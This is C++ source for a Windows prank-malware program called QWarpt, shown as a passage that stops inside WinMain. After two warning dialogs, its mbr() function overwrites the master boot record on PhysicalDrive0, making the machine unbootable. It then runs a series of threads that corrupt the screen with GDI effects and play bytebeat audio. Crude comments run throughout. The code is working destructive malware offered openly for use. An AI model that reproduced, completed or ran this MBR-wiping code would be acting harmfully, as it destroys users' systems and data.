//imagine having fard
#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#include "halal.hpp" //halal.hpp seems legit

#pragma comment(lib, "winmm.lib")

void mbr() //fuckyouloris
{  
    // Sleepmod tutorial code  
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
     HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1); //this effect is kinda cool //your mom kinda cool
    while (1) {
        desk = GetDC(0);
        int rx = rand() % sw;
        int ry = rand() % sh;    
        for (int i = 0; i < 17; i++) {
            BitBlt(desk, rx, 1, sw, sh, desk, rx, 0, SRCCOPY);
            BitBlt(desk, rx, -1, -sw, sh, desk, rx, 0, SRCCOPY);
            BitBlt(desk, 1, ry, sw, sh, desk, 0, ry, SRCCOPY);
            BitBlt(desk, -1, ry, -sw, sh, desk, 0, ry, SRCCOPY);
        }
    }
}

DWORD WINAPI payload2(LPVOID lpParam) { //halal payload //haram gay effect
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));

        PatBlt(desk, 0, 0, sw, sh, PATINVERT);

        Sleep(1000);

    }

}
DWORD WINAPI payload2dot1(LPVOID lpParam) { //idk fuck?
    HDC desk = GetDC(0); //why 2

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0); //why 2?

        int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;

        for (int t = 0; t < sw + sh; ++t) {
            // Very cool float, ngl LMFAOOOO
            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),

                y = (int)(float)(radius + t * cos(t + radius * 3) + ry);

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ASTERISK)); Sleep(0.99); }

        }

        InvalidateRect(0, 0, 0);

    }

}

DWORD WINAPI payload3(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(desk, 0, 0, sw, sh, PATCOPY);
        Sleep(1000);
    }
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HDC desk = GetDC(0); //kill me
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
    while (1) {
        desk = GetDC(0); // go die
        int a = rand() % sw, b = rand() % sh;
        BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCAND);
        BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
        BitBlt(desk, a, b, sw, sh, desk, a + tan(rand() % 21 - 10), b + tan(rand() % 21 - 10), SRCCOPY);
        BitBlt(desk, a, b, sw, sh, desk, a + sin(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
        BitBlt(desk, a, b, sw, sh, desk, a + tan(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
    }
}

DWORD WINAPI payload5(LPVOID lpParam) { //this shit code is a mess
    while (1) {
        //Skidded from Magnetar
        int width, height;

        HWND hwnd;



        width = GetSystemMetrics(SM_CXSCREEN);

        height = GetSystemMetrics(SM_CYSCREEN);

        hwnd = GetDesktopWindow();    HDC hdc = GetDC(NULL);

        RECT rekt;

        GetWindowRect(hwnd, &rekt);

        HBRUSH rainbow = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));

        SelectObject(hdc, rainbow);

        int xyrng = rand() % width, h = height - rand() % width - (width / 2 - 110);



        POINT pt3[3];

        int inc3 = 60;

        inc3++;

        pt3[0].x = rekt.left + inc3;

        pt3[0].y = rekt.top - inc3;

        pt3[1].x = rekt.right + inc3;

        pt3[1].y = rekt.top + inc3;

        pt3[2].x = rekt.left - inc3;

        pt3[2].y = rekt.bottom - inc3;



        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);

        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);

        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);

        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);
        
        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, NULL, NULL, NULL);

        StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, NULL, NULL, width, height, SRCCOPY);

        StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, NULL, NULL, width, height, SRCCOPY);

    }

}

DWORD WINAPI payload6(LPVOID lpParam) { //first payload but with y pos and x pos
    HDC desk = GetDC(0); //fuck
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        int x = rand() % y;
        int y = rand() % x;
        for (int i = 0; i < 17; i++) {
            BitBlt(desk, x, 3, y, y, desk, x, 0, SRCCOPY);
            BitBlt(desk, x, -2, -y, x, desk, x, 0, SRCCOPY);
            BitBlt(desk, 3, y, y, x, desk, 0, x, SRCCOPY);
            BitBlt(desk, -6, x, -y, x, desk, 0, y, SRCCOPY);
        }
    }
}

DWORD WINAPI payload7(LPVOID lpParam) { //most halal payload
    HDC desk = GetDC(0);
    //Lmfao mf
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    int x1 = GetSystemMetrics(0), y1 = GetSystemMetrics(1);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int ry = GetSystemMetrics(0), rx = GetSystemMetrics(1);
    while (1) {
        desk = GetDC(0);
        int x = rand() % y;
        int y = rand() % x;
        for (int i = 0; i < 17; i++) {
            BitBlt(desk, x1, 3, y1, y1, desk, x1, 0, SRCCOPY);
            BitBlt(desk, x, -2, -y, x, desk, x, 0, SRCCOPY);
            BitBlt(desk, 3, y1, y1, x1, desk, 0, x1, SRCCOPY);
            BitBlt(desk, -6, x, -y, x, desk, 0, y, SRCCOPY);
            BitBlt(desk, x1, 3, y1, y1, desk, x1, 0, SRCCOPY);
            BitBlt(desk, x, -2, -y, x, desk, x, 0, SRCCOPY);
            BitBlt(desk, 3, y1, y1, x1, desk, 0, x1, SRCCOPY);
            BitBlt(desk, -6, x, -y, x, desk, 0, y, SRCCOPY);
            BitBlt(desk, rx, 1, sw, sh, desk, rx, 0, SRCCOPY);
            BitBlt(desk, rx, -1, -sw, sh, desk, rx, 0, SRCCOPY);
            BitBlt(desk, 1, ry, sw, sh, desk, 0, ry, SRCCOPY);
            BitBlt(desk, -1, ry, -sw, sh, desk, 0, ry, SRCCOPY);

        }
    }
}

DWORD WINAPI payload8(LPVOID lpParam) { //this payload was in solaris 2.0 fun fuck right?
    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN); // why this using macro???, He using number before

    int c = 0;

    for (int a = 0;; a++, a %= 9)

    {

        if (!a) RedrawWindow(0, 0, 0, 133);



        for (int t = 0; t < rand() % 3; t++)

        {

            for (int c = 0; c < rand() % 10; c++)

            {

                int y = rand() % sx, h = sy - rand() % sy - (sy / 2 - 58);

                int r = rand() % 3;

                HBRUSH brush;

                HDC hdc = GetDC(0);

                if (r == 0)

                {

                    brush = CreateSolidBrush(RGB(rand() % 100 + 155, 0, 0));

                    SelectObject(hdc, brush);

                }

                if (r == 1)

                {

                    brush = CreateSolidBrush(RGB(0, rand() % 100 + 155, 0));

                    SelectObject(hdc, brush);

                }

                if (r == 2)

                {

                    brush = CreateSolidBrush(RGB(0, 0, rand() % 100 + 155));

                    SelectObject(hdc, brush);

                }



                BitBlt(hdc, 0, y, sx, h, hdc, rand() % 244 - 112, y, SRCCOPY);

              

            }

            Sleep(1);

        }

    }

    return 0;

}

DWORD WINAPI payload9(LPVOID lpParam) { //Im fucking lazy
    for (;;) //why using for loop, previous while loop
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
        int r = rand() % sh;
        int r2 = rand() % 5;
        if (r2 == 0)
        {
            BitBlt(hdc, 1, r, sw, 15, hdc, 0, r, SRCCOPY);
        }
        else if (r2 == 1)
        {
            BitBlt(hdc, 0, r, sw, 15, hdc, 1, r, SRCCOPY);
        }
    DeleteDC(hdc);
}
}

DWORD WINAPI payload9dot2(LPVOID lpParam) { //S E X P I X E L
     while (1) {
        // Again from Magnetar
        HWND hwnd = GetDesktopWindow();

        HDC desktop = GetWindowDC(hwnd);

        HDC hdc = GetDC(NULL);

        RECT rekt;

        GetWindowRect(hwnd, &rekt);



        COLORREF clrrainbow = RGB(rand() % 255, rand() % 255, rand() % 255);



        for (int a = 0; a < rekt.right; a += 20)

        {

            for (int b = 0; b < rekt.bottom; b += 20)

            {

                SetPixel(hdc, a, b, clrrainbow);

            }

        }



        const double PI = 3.141592653589793238462643383279;

        const int xwave = 50;

        const int ywave = 100;

        for (double i = -2000; i < 2000; i += 0.01)

        {

            double j = sin(PI / xwave * i) * ywave;

            BitBlt(hdc, 600 + i, 600 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 600 + i, 600 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);

            BitBlt(hdc, 600 + i, 600 + j, rekt.right, rekt.bottom, hdc, 0, 0, SRCCOPY);

        }

    }

}


DWORD WINAPI payload10(LPVOID lpParam) {
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        

        StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY);

        Sleep(150);

    }

}

DWORD WINAPI payload11(LPVOID lpParam) { //green screen kinda cool
    // Skidded from Nikitpad tutorial
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // is he understand why should allocate memory?

    HDC hdc, hdcMem; HBITMAP hbm;

    for (int i = 0;; i++, i %= 6) {

        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);

        SelectObject(hdcMem, hbm);

        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);

        for (int i = 0; w * h > i; i++) {

            int x = i * w + i, y = i * h + i, f = (y | x + y + -1 + x + w / h);

            ((BYTE*)(data + i))[9] = (f / 1);

        }

        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);

        DeleteObject(hbm); DeleteObject(hdcMem);

        DeleteObject(hdc);

        Sleep(rand() % 100);

    }

}
DWORD WINAPI payload12(LPVOID lpParam) { //why the fuck
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        int x1 = (rand() % sw - 400);

        int y1 = (rand() % sw - 400);

        int x2 = (rand() % sw - 400);

        int y2 = (rand() % sw - 400);

        int w = (rand() % 400);

        int h = (rand() % 400);

        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCERASE : NOTSRCERASE);

        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? NOTSRCCOPY : SRCPAINT);

        BitBlt(desk, x1, y2, w, h, desk, x2, y2, !(rand() % 2) ? SRCCOPY : SRCAND);

        Sleep(150);

    }

}

DWORD WINAPI payload13(LPVOID lpParam) { //im lazy, hep
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); //epic gdi leak

        PatBlt(desk, 0, 0, sw, sh, PATINVERT);

        Sleep(1000);

    }

}

DWORD WINAPI payload13dot2(LPVOID lpParam) { //why u see this code all time? SINE WAVES
    for (;;) 
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
        int r = rand() % sh;
        int r2 = rand() % 5;
        if (r2 == 0)
        {
            BitBlt(hdc, 1, r, sw, 15, hdc, 0, r, SRCCOPY);
        }
        else if (r2 == 1)
        {
            BitBlt(hdc, 0, r, sw, 15, hdc, 1, r, SRCCOPY);
        }
    DeleteDC(hdc);
}
} // sine waves ripoff

DWORD WINAPI payload13dot3(LPVOID lpParam) {
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;

        for (int t = 0; t < sw + sh; ++t) {

            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),

                y = (int)(float)(radius + t * cos(t + radius * 3) + ry);

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); } //what the fuck put float in Sleep

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }

            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }

        }

        InvalidateRect(0, 0, 0);

    }

}

DWORD WINAPI payload13dot4(LPVOID lpParam) {
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));

        PatBlt(desk, 0, 0, sw, sh, PATINVERT);

        Sleep(1000);

    }

}

DWORD WINAPI payload13dot5(LPVOID lpParam) {
    HDC desk = GetDC(0);

    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

    while (1) {

        desk = GetDC(0);

        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));

        PatBlt(desk, 0, 0, sw, sh, PATINVERT);

        Sleep(1000);

    }

}

DWORD WINAPI payload14(LPVOID lpParam) {
    for (;;) 
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
        int r = rand() % sh;
        int r2 = rand() % 5;
        if (r2 == 0)
        {
            BitBlt(hdc, 1, r, sw, 15, hdc, 0, r, SRCCOPY);
        }
        else if (r2 == 1)
        {
            BitBlt(hdc, 0, r, sw, 15, hdc, 1, r, SRCCOPY);
        }
    DeleteDC(hdc);
}
}

DWORD WINAPI payload15(LPVOID lpParam) {
    for (;;) 
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
        int r = rand() % sh;
        int r2 = rand() % 5;
        if (r2 == 0)
        {
            BitBlt(hdc, 1, r, sw, 15, hdc, 0, r, SRCCOPY);
        }
        else if (r2 == 1)
        {
            BitBlt(hdc, 0, r, sw, 15, hdc, 1, r, SRCCOPY);
        }
    DeleteDC(hdc);
}
} //ok fuck payloads done

VOID WINAPI sound1() { //baitbeat
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {}; // i like this
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 9) * (t >> 5) - t * cos(t >> 1); //cos

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 8) * (t >> 4) + t * (t >> 3); //helicopter cum

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 1) * (t >> 0) - t * (t >> 6); // wtf

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6) * (t >> 8) + t * (t >> 9); // lolz

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6) * (t >> 6) - t * (t >> 6); //nosund

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 15] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 0) * (t >> 1) + t * (t >> 4); // fuck

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 88)) ^ (959887476 & t) ^ (7879 & t) - t / 16;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 25] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 1 | t >> 3 | t >> 1 | t >> 1 | t * 2 | t >> 1 | t * 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1)) ^ (1 & t); // like six

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 20] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1)) ^ (1 & t) ^ (1 & t) - t / 9 | t * 29 | t * 7 | t >> 2;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
   //Memz skid
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"QWarpt", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"QWarpt", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            //TerminateThread make me cancer, also the some code too.

            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(15000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
            Sleep(25000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            sound6();
            Sleep(15000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
            sound7();
            Sleep(25000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
            sound8();
            Sleep(25000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
            HANDLE thread9dot2 = CreateThread(0, 0, payload9dot2, 0, 0, 0);
            sound9();
            Sleep(20000);
            TerminateThread(thread9, 0);
            TerminateThread(thread9dot2, 0);
            CloseHandle(thread9);
            CloseHandle(thread9dot2);
            HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
            sound10();
            Sleep(25000);
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
            HANDLE thread13dot2 = CreateThread(0, 0, payload13dot2, 0, 0, 0);
            HANDLE thread13dot3 = CreateThread(0, 0, payload13dot3, 0, 0, 0);
            HANDLE thread13dot4 = CreateThread(0, 0, payload13dot4, 0, 0, 0);
            HANDLE thread13dot5 = CreateThread(0, 0, payload13dot5, 0, 0, 0);
            Sleep(25000);
            TerminateThread(thread13, 0);
            TerminateThread(thread13dot2, 0);
            TerminateThread(thread13dot3, 0);
            TerminateThread(thread13dot4, 0);
            TerminateThread(thread13dot5, 0);
            CloseHandle(thread13);
            CloseHandle(thread13dot2);
